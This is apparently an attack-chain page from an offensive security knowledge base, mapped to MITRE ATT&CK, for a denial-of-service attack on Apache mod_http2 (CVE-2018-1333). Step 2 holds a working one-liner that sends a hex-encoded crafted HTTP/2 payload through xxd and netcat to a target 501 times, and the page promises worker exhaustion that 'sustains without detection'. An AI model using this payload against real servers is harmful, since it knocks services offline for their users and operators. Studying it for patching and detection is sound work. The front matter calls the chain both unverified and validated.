---
id: ac-cve-2018-1333-dos-http2
tags:
  - dos
  - http2
  - apache
  - mod_http2
  - resource-exhaustion
  - cve-2018-1333
type: attack_chain
tools:
  - '[[tools/afl-fuzz]]'
  - '[[tools/xxd]]'
  - '[[tools/nc]]'
  - '[[tools/seq]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Discover-Malicious-HTTP2-Requests-with-AFL-Fuzz]]'
  - '[[procedures/Exploit-mod-http2-DoS-by-Sending-Crafted-Requests]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:26:48.468Z'
description: >-
  A denial-of-service attack exploiting CVE-2018-1333 in Apache's mod_http2
  module by sending crafted HTTP/2 requests that cause worker threads to hang on
  incomplete data, leading to resource exhaustion and service unresponsiveness.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# DoS on Apache mod_http2 via Crafted HTTP/2 Requests Exhausting Worker Threads

Multi-stage attack chain demonstrating a complete denial-of-service workflow against Apache HTTP Server with mod_http2 enabled, exploiting CVE-2018-1333 to exhaust worker threads.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery of Malicious Requests] --> B[Send Crafted Requests to Exhaust Resources]
    B --> C[Service Unresponsiveness]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/afl-fuzz]]
- [[tools/xxd]]
- [[tools/nc]]
- [[tools/seq]]

### Target Environment

- Apache HTTP Server 2.4.x with mod_http2 module enabled and h2c (HTTP/2 over cleartext) support
- Typically Linux-based web server
- Ports: 80 or 443 (h2c enabled on cleartext port)
- Worker pool configured (e.g., 150 workers with 1-minute timeout)

### Initial Access Requirements

- Network access to the target server's HTTP/2 endpoint
- No credentials required; public-facing application
- Knowledge of target hostname and port

## Detailed Attack Procedures

### Step 1: Discovery of Malicious Requests
procedure: [[procedures/Discover-Malicious-HTTP2-Requests-with-AFL-Fuzz]]

**Objective**: Use fuzzing to identify specially crafted HTTP/2 requests that cause the mod_http2 module to hold worker threads open indefinitely while waiting for incomplete data.

**Instructions**: Set up AFL-Fuzz to target the mod_http2 handling logic on a local or test Apache instance with h2c enabled. Feed sample HTTP/2 frames and monitor for requests that trigger prolonged resource holding until timeout.

**Expected Output**: Identification of problematic request patterns, such as incomplete HEADERS or DATA frames that lack proper validation, leading to hangs.

**Success Indicators**:
- Fuzzing uncovers requests causing >30 seconds of thread blocking
- Reproducible hangs in worker processes observed via server logs or monitoring tools like top

### Step 2: Exploitation of Resource Exhaustion
procedure: [[procedures/Exploit-mod-http2-DoS-by-Sending-Crafted-Requests]]

**Objective**: Flood the target server with a low rate of crafted HTTP/2 requests to exhaust the worker pool, rendering the service unresponsive to legitimate traffic.

**Instructions**: Prepare the hexadecimal-encoded HTTP/2 payload and use a loop to send 501 instances via netcat in the background. Replace 'hostname' and 'port' with target details. Monitor server responsiveness with tools like curl to legitimate endpoints.

Execute the attack using [[commands/send-crafted-http2-requests-loop]]:

```bash
for x in `seq 0 500`; do echo 505249202a20485454502f322e300d0a0d0a534d0d0a0d0a00001204000000000000000000006400044000000000020000000000001b0104000000018284864187089d5c0b8178ff7a8825b650c3abb6f2e053032a2f2a00001b0105000000019a84864187089d5c0b8178ff7a880000000000000000 | xxd -r -p | nc hostname port 2>&1 >/dev/null & done
```

After sending, test server with:

```bash
curl -v http://hostname/
```

**Expected Output**: No visible output from the command due to redirection; server logs show worker threads timing out after 1 minute, and curl requests to the server hang or fail.

**Success Indicators**:
- Server stops responding to new requests within 1-2 minutes
- All 150 workers exhausted, confirmed by Apache error logs (e.g., 'server reached MaxRequestWorkers')
- Attack rate of 3-4 requests/second sustains without detection

## Attack Chain Summary

### Key Achievements

1. Discovery of exploitable HTTP/2 request flaws using fuzzing
2. Low-rate DoS that evades rate-limiting by mimicking incomplete legitimate traffic
3. Full service denial by exhausting configurable worker pool

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
